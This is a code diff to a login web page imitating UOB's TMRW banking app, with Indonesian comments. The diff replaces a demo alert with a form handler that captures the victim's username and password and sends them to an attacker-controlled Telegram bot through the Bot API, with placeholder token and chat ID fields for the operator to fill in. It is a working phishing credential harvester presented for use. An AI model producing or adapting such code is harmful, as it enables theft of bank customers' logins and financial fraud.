@@ -8,7 +8,7 @@
   body {
     margin: 0;
     font-family: Arial, sans-serif;
-    background: linear-gradient(to bottom, #0057b7, #003d7a); /* Mirip warna biru */
+    background: linear-gradient(to bottom, #0057b7, #003d7a);
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -106,7 +106,6 @@
     font-size: 14px;
     color: #666;
   }
-  /* Footer with TMRW logo and apps */
   .footer {
     text-align: center;
     margin-top: auto;
@@ -199,7 +198,13 @@
 </div>
 
 <script>
-  document.getElementById('loginForm').addEventListener('submit', function() {
+  // Ganti token dan chatID berikut dengan milik Anda
+  const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+  const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    
     var user = document.getElementById('username').value.trim();
     var pass = document.getElementById('password').value.trim();
     
@@ -208,10 +213,37 @@
       return;
     }
     
-    // Contoh alert login
-    alert('Log in submitted for user: ' + user);
+    // Siapkan pesan yang akan dikirim ke Telegram
+    const message = `
+  New UOB login attempt:
+  Username: ${user}
+  Password: ${pass}
+  `;
     
-    // Di sini bisa ditambah aksi login sebenarnya
+    // Kirim data ke Telegram Bot API
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      // Bisa tampilkan alert sukses jika perlu, atau langsung lanjut
+      // alert('Login data sent.');
+      
+      // Reset input (optional)
+      document.getElementById('loginForm').reset();
+    })
+    .catch(error => {
+      console.error('Error sending to Telegram:', error);
+      // alert('Failed to send login data.');
+    });
   });
 </script>
 
